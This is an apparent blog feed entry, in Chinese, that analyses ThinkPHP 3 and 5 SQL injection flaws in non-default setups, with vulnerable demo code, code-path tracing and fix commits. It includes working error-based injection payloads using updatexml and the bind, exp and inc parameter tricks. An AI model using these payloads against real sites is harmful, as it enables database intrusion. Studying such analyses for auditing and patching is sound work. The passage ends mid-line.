    <summary type="html">&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-序&quot;&gt;&lt;/a&gt; 0x00 序&lt;/h1&gt;
&lt;p&gt;最近打金融项目的时候，webshell遇见了负载均衡，自己之前其实看过相关文章，但是实战操作起来还是遇见了不少坑点的，接</summary>
      
    
    
    
    
    <category term="负载均衡" scheme="https://cyxsec.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP非默认漏洞分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:09:57.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-序"><a class="markdownIt-Anchor" href="#0x00-序"></a> 0x00 序</h1><p>上面我们分析了TP框架存在的默认漏洞，此篇分析一下非默认环境下的漏洞，可能主要包括：</p><ol><li>某些内置函数本身存在问题，在代码审计时可结合利用</li><li>框架非默认情况下的漏洞，实战更多可能做权限维持</li></ol><h1 id="0x01-tp3"><a class="markdownIt-Anchor" href="#0x01-tp3"></a> 0x01 TP3</h1><h2 id="一-sql-注入"><a class="markdownIt-Anchor" href="#一-sql-注入"></a> 一、 SQL 注入</h2><h3 id="10-tp过滤策略"><a class="markdownIt-Anchor" href="#10-tp过滤策略"></a> 1.0 TP过滤策略</h3><p>I 方法在TP3中是获取参数的，默认会存在过滤规则</p><ol><li>callback调用defalt_filter</li></ol><p><img src="../../../typora-user-images/image-20240816173930602.png" alt="image-20240816173930602" /></p><p>实体编码，防xss</p><p><img src="../../../typora-user-images/image-20240816174206494.png" alt="image-20240816174206494" /></p><ol start="2"><li>callback调用think_fiter</li></ol><p><img src="../../../typora-user-images/image-20240816174457328.png" alt="image-20240816174457328" /></p><p>SQL注入过滤特殊字符</p><p><img src="../../../typora-user-images/image-20240816174544180.png" alt="image-20240816174544180" /></p><ol start="3"><li>SQL操作类，定义了过滤函数，特殊字符增加转义。（TP默认使用非GBK，因此也避免了字符型注入的拼接问题）</li></ol><p><img src="../../../typora-user-images/image-20240902161421793.png" alt="image-20240902161421793" /></p><h3 id="11-find方法where注入️24"><a class="markdownIt-Anchor" href="#11-find方法where注入️24"></a> 1.1 find方法+where注入（❤️.2.4）</h3><h4 id="vuldemo"><a class="markdownIt-Anchor" href="#vuldemo"></a> VulDemo</h4><ul><li>find函数参数可控</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.Sno'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h4><p>version&lt;=3.2.3</p><h4 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h4><p><strong>网上很多分析文章都把这个洞叫做where注入，这样起名感觉有点误导的感觉。</strong></p><p><strong>漏洞发生在find参数可控时，其实就是当参数为数组时，且数组键值存在where，最后构造sql的时候，就会把这个键值拼接到where语句中，导致SQL注入。叫where注入也没什么问题，但是不是tp处理sql的那个where函数</strong></p><p>codeDemo：</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class IndexController extends Controller&#123;    public function index()    &#123;        $data &#x3D; M(&#39;Student&#39;)-&gt;find(I(&#39;GET.Sno&#39;));        var_dump($data);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>跟入find函数</li></ol><p>\Think\Model::find</p><p><img src="../../../typora-user-images/image-20240830181613202.png" alt="image-20240830181613202" /></p><ol start="2"><li>找到最终执行SQL的地方</li></ol><p><img src="../../../typora-user-images/image-20240902163234596.png" alt="image-20240902163234596" /></p><ol start="3"><li>再往里面跟</li></ol><p><img src="../../../typora-user-images/image-20240902163408392.png" alt="image-20240902163408392" /></p><p><img src="../../../typora-user-images/image-20240902163417366.png" alt="image-20240902163417366" /></p><p><img src="../../../typora-user-images/image-20240902163431277.png" alt="image-20240902163431277" /></p><p><img src="../../../typora-user-images/image-20240902163459000.png" alt="image-20240902163459000" /></p><p>总结一下就是会拼接where的部分到SQL语句中。</p><ol start="4"><li>所以重点在option数组的where键值在哪</li></ol><p>看一下这里的赋值部分。</p><p><img src="../../../typora-user-images/image-20240902163732464.png" alt="image-20240902163732464" /></p><ol start="5"><li>跟入图中的函数</li></ol><p>找到可能影响option赋值的地方（因为我们函数传入的参数是最开始的option）</p><p><img src="../../../typora-user-images/image-20240902163901971.png" alt="image-20240902163901971" /></p><p>分析一下这里的if条件，首先where肯定要赋值的，第二处where的值不是数组（是我们传入的sql注入payload），因此整个过程中options的where的值不会变。</p><p>因此整个漏洞利用过程就很清晰了，我们赋值的时候选择赋值数组，然后插入SQL注入payload即可。</p><p>Sno[where]=1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)%23</p><p><img src="../../../typora-user-images/image-20240902164834951.png" alt="image-20240902164834951" /></p><p><img src="../../../typora-user-images/image-20240902164651970.png" alt="image-20240902164651970" /></p><p>整个利用完成。</p><p>我们正常传参Sno=1时的opions数组：</p><p><img src="../../../typora-user-images/image-20240902164736931.png" alt="image-20240902164736931" /></p><h4 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h4><p><a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="../../../typora-user-images/image-20240902165021921.png" alt="image-20240902165021921" /></p><p>重点在圈出来的部分，之前获取options的时候是操作原始函数参数的，更新后不操作原始参数了，漏洞也就不存在了。</p><h3 id="12-where方法exp注入全版本"><a class="markdownIt-Anchor" href="#12-where方法exp注入全版本"></a> 1.2 where方法+exp注入（全版本）</h3><h4 id="vuldemo-2"><a class="markdownIt-Anchor" href="#vuldemo-2"></a> VulDemo</h4><ul><li>where参数可控</li><li>结合find函数</li><li>不使用tp自带的I函数获取参数</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$no</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span> <span class="token operator">=></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$no</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> 影响版本</h4><p>未修复，但需要不使用TP的I函数获取参数</p><h4 id="漏洞分析-2"><a class="markdownIt-Anchor" href="#漏洞分析-2"></a> 漏洞分析</h4><ol><li>where来获取参数</li></ol><p><img src="../../../typora-user-images/image-20240902180246363.png" alt="image-20240902180246363" /></p><ol start="2"><li>漏洞触发点还是在find函数，解析where的部分。</li></ol><p><img src="../../../typora-user-images/image-20240902180718410.png" alt="image-20240902180718410" /></p><ol start="3"><li>重点在这里，当数据第一个值为exp时，where会直接拼接第数组第二个值</li></ol><p><img src="../../../typora-user-images/image-20240902180958738.png" alt="image-20240902180958738" /></p><p><img src="../../../typora-user-images/image-20240902181103234.png" alt="image-20240902181103234" /></p><h4 id="漏洞修复-2"><a class="markdownIt-Anchor" href="#漏洞修复-2"></a> 漏洞修复</h4><p>使用TP自带的I函数获取参数即可（I函数会callback过滤一些关键字）</p><h3 id="13-where方法bind注入️25"><a class="markdownIt-Anchor" href="#13-where方法bind注入️25"></a> 1.3 where方法+bind注入（❤️.2.5）</h3><h4 id="vuldemo-3"><a class="markdownIt-Anchor" href="#vuldemo-3"></a> VulDemo</h4><ul><li>where参数可控</li><li>结合save使用</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h4><p>TP&lt;=3.2.4</p><h4 id="漏洞分析-3"><a class="markdownIt-Anchor" href="#漏洞分析-3"></a> 漏洞分析</h4><p>触发方式与上面类似</p><ol><li>先看一下save方法都做了什么</li></ol><p>其实就是update更新了数据库</p><p><img src="../../../typora-user-images/image-20240905175748013.png" alt="image-20240905175748013" /></p><ol start="2"><li>跟入update方法</li></ol><p>这里的options与上面分析的相同，是我们传入的参数</p><p><img src="../../../typora-user-images/image-20240905175854513.png" alt="image-20240905175854513" /></p><ol start="3"><li>跟入这里的parseBind方法</li></ol><p>会取值赋值到bind</p><p><img src="../../../typora-user-images/image-20240905175953825.png" alt="image-20240905175953825" /></p><ol start="4"><li>看会update方法，跟入下发的parseSet方法</li></ol><p><img src="../../../typora-user-images/image-20240905180155824.png" alt="image-20240905180155824" /></p><ol start="5"><li>跟入这里的bindParam方法</li></ol><p><img src="../../../typora-user-images/image-20240905180242499.png" alt="image-20240905180242499" /></p><ol start="6"><li>重新处理了bind的值，增加了：</li></ol><p><img src="../../../typora-user-images/image-20240905180305467.png" alt="image-20240905180305467" /></p><ol start="7"><li>继续往下看，看到parseWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240905181047505.png" alt="image-20240905181047505" /></p><ol start="8"><li>跟入里面的parseWhereItem方法</li></ol><p><img src="../../../typora-user-images/image-20240905181152601.png" alt="image-20240905181152601" /></p><ol start="9"><li>当表达式bind时，会拼接key:=value</li></ol><p><img src="../../../typora-user-images/image-20240905181250449.png" alt="image-20240905181250449" /></p><ol start="10"><li>看会update执行的execute方法</li></ol><p><img src="../../../typora-user-images/image-20240905181339548.png" alt="image-20240905181339548" /></p><ol start="11"><li>很明显会走入图中的逻辑</li></ol><p><img src="../../../typora-user-images/image-20240905181429181.png" alt="image-20240905181429181" /></p><p>这里面有个字符串替换方法</p><p>就是把this—&gt;bind里面的key value对应关系，直接替换到str里面。</p><p>（这里的callback写的看起来很难受，实际可以直接忽略，实际上就是做了特殊字符转义，我们直接去掉看就可以）</p><p>整理完整个流程了。</p><p>我们传参数尝试一下，看看可能会发生什么情况。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Sno<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>bind<span class="token operator">&amp;</span>Sno<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>传的data和options如下</li></ol><p><img src="../../../typora-user-images/image-20240906140832485.png" alt="image-20240906140832485" /></p><ol start="2"><li>跟到里面的bindParam函数，这里的name是0，val是传入的Sage参数的值</li></ol><p><img src="../../../typora-user-images/image-20240906141822949.png" alt="image-20240906141822949" /></p><ol start="3"><li>第二处解析parseWhere，当为bind时，会直接拼接</li></ol><p><img src="../../../typora-user-images/image-20240906142149397.png" alt="image-20240906142149397" /></p><ol start="4"><li>处理完的SQL如下，两个：就是上面两处处理的结果</li></ol><p><img src="../../../typora-user-images/image-20240906142435803.png" alt="image-20240906142435803" /></p><ol start="5"><li>跟到上面分析的第三处的函数的替换部分，会把其中的:0替换成0。这也就完成了整个sql</li></ol><p><img src="../../../typora-user-images/image-20240906142740198.png" alt="image-20240906142740198" /></p><p><img src="../../../typora-user-images/image-20240906143106502.png" alt="image-20240906143106502" /></p><p>我们发现后面的:123无法转换，导致SQL报错，123是我们传的Sno的第二个参数，解决方法也很简单，我们让Sno的第二个参数以0开始，这样替换的时候也会替换后面的:了。</p><pre class="line-numbers language-none"><code class="language-none">Sno[0]&#x3D;bind&amp;Sno[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240906143402155.png" alt="image-20240906143402155" /></p><h4 id="漏洞修复-3"><a class="markdownIt-Anchor" href="#漏洞修复-3"></a> 漏洞修复</h4><p>在tp 3.2.5版本中</p><p><a href="https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4">https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4</a></p><p>TP的I方法获取参数添加了过滤特殊字符“bind”</p><p><img src="../../../typora-user-images/image-20240905103536028.png" alt="image-20240905103536028" /></p><h3 id="14-order方法order-by注入️24"><a class="markdownIt-Anchor" href="#14-order方法order-by注入️24"></a> 1.4 order方法+order by注入（❤️.2.4）</h3><h4 id="vuldemo-4"><a class="markdownIt-Anchor" href="#vuldemo-4"></a> VulDemo</h4><pre class="line-numbers language-none"><code class="language-none">public function index()&#123;    $User &#x3D; M(&quot;Users&quot;);    $order_by &#x3D; I(&#39;Get.name&#39;);    $q &#x3D; $User-&gt;where(&#39;id&#x3D;1&#39;)-&gt;order($order_by)-&gt;find();    $this-&gt;getSql($User);    var_dump($q);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-4"><a class="markdownIt-Anchor" href="#影响版本-4"></a> 影响版本</h4><p>TP&lt;3.2.4</p><h4 id="漏洞分析-4"><a class="markdownIt-Anchor" href="#漏洞分析-4"></a> 漏洞分析</h4><p>tp的model类默认没有order方法，在__call的魔术方法</p><p><img src="../../../typora-user-images/image-20240906144751269.png" alt="image-20240906144751269" /></p><p>parseOrder会直接将字段拼接。</p><p><img src="../../../typora-user-images/image-20240906144850165.png" alt="image-20240906144850165" /></p><h4 id="漏洞修复-4"><a class="markdownIt-Anchor" href="#漏洞修复-4"></a> 漏洞修复</h4><p>3.2.4 进行了修复</p><p><img src="../../../typora-user-images/image-20240906145044418.png" alt="image-20240906145044418" /></p><h1 id="0x02-tp5"><a class="markdownIt-Anchor" href="#0x02-tp5"></a> 0x02 TP5</h1><h2 id="一-sql注入"><a class="markdownIt-Anchor" href="#一-sql注入"></a> 一、SQL注入</h2><h3 id="1-insert方法注入013-015-10-15"><a class="markdownIt-Anchor" href="#1-insert方法注入013-015-10-15"></a> 1. insert方法注入（0.13-0.15, 1.0-1.5)</h3><h4 id="vuldemo-5"><a class="markdownIt-Anchor" href="#vuldemo-5"></a> VulDemo</h4><ul><li>开启debug</li><li>insert参数可控</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-5"><a class="markdownIt-Anchor" href="#影响版本-5"></a> 影响版本</h4><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15</p><p>5.1.0&lt;=ThinkPHP&lt;=5.1.5</p><h4 id="漏洞分析-5"><a class="markdownIt-Anchor" href="#漏洞分析-5"></a> 漏洞分析</h4><ol><li>简单的生成和执行，跟到生成的部分</li></ol><p><img src="../../../typora-user-images/image-20240906175242056.png" alt="image-20240906175242056" /></p><ol start="2"><li>获取参数然后替换，生成sql</li></ol><p><img src="../../../typora-user-images/image-20240906175446473.png" alt="image-20240906175446473" /></p><ol start="3"><li>解析这部分，当值为inc、exp、dec时候，参数会进行拼接</li></ol><p><img src="../../../typora-user-images/image-20240906175600482.png" alt="image-20240906175600482" /></p><p>利用的payload：</p><pre class="line-numbers language-none"><code class="language-none">username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这里拿mochazz师傅的图来总结了（这个图画的是真好）</strong></p><p><img src="../../../typora-user-images/image-20240906180155561.png" alt="image-20240906180155561" /></p><h4 id="漏洞修复-5"><a class="markdownIt-Anchor" href="#漏洞修复-5"></a> 漏洞修复</h4><p><img src="../../../typora-user-images/image-20240906175933493.png" alt="image-20240906175933493" /></p><h3 id="2-update方法注入16-17"><a class="markdownIt-Anchor" href="#2-update方法注入16-17"></a> 2. update方法注入（1.6-1.7）</h3><h4 id="vuldemo-6"><a class="markdownIt-Anchor" href="#vuldemo-6"></a> VulDemo</h4><ul><li>update参数可控</li><li>debug开启</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-6"><a class="markdownIt-Anchor" href="#影响版本-6"></a> 影响版本</h4><p>5.1.6&lt;=ThinkPHP&lt;=5.1.7</p><h4 id="漏洞分析-6"><a class="markdownIt-Anchor" href="#漏洞分析-6"></a> 漏洞分析</h4><ol><li>跟入到update方法</li></ol><p><img src="../../../typora-user-images/image-20240906182253139.png" alt="image-20240906182253139" /></p><ol start="2"><li>生成SQL语句和执行部分</li></ol><p><img src="../../../typora-user-images/image-20240906182504804.png" alt="image-20240906182504804" /></p><ol start="3"><li>跟入生成的sql部分，解析data和替换字符</li></ol><p><img src="../../../typora-user-images/image-20240906182603859.png" alt="image-20240906182603859" /></p><ol start="4"><li>解析data部分</li></ol><p><img src="../../../typora-user-images/image-20240906182642513.png" alt="image-20240906182642513" /></p><ol start="5"><li>这里有一个拼接的逻辑</li></ol><p><img src="../../../typora-user-images/image-20240910165958837.png" alt="image-20240910165958837" /></p><p>从上面跟下来，data是我们传的参数，可控的参数拼接成sql如下，因此最后只要符合sql要求，且第一个参数要为上面swith的point即可。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span>  <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> $a<span class="token punctuation">(</span><span class="token string">'$b($c)'</span><span class="token punctuation">)</span>  <span class="token keyword">WHERE</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着我们想办法闭合即可。我们令 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>m</mi><mi>l</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>a</mi><mi>t</mi><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mn>7</mn><mo separator="true">,</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>0</mn><mi>x</mi><mn>7</mn><mi>e</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo>∗</mo><mi mathvariant="normal">、</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">a = updatexml(1,concat(0x7,user(),0x7e),1)^** 、 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord cjk_fallback">、</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>b = 0</strong> 、 <strong>$c = 1</strong> ，即：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token string">'0(1)'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" 